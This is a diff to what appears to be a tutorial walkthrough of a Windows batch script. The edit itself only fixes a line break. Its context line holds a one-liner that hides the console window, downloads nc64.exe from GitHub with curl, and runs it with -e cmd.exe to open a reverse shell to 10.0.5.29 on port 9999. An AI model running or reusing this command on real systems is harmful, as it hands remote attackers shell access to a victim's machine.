@@ -9,7 +9,8 @@ Let’s take a look at the script we are using.
 call getCmdPid
 call windowMode -pid %errorlevel% -mode hidden & curl https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe -o C:\Users\Public\Downloads\nc64.exe & C:\Users\Public\Downloads\nc64.exe -e cmd.exe 10.0.5.29 9999`
 
-What the script does :\n
+What the script does :
+
 `@echo off` is a standard directive in batch files (.bat) in Windows, and it serves a similar purpose to #!/bin/bash in Linux shell scripts. Its job is to not show the commands that are being ran.
 
 `getCmdPid.exe` is responsible for printing the PID number of the windows process we are using.
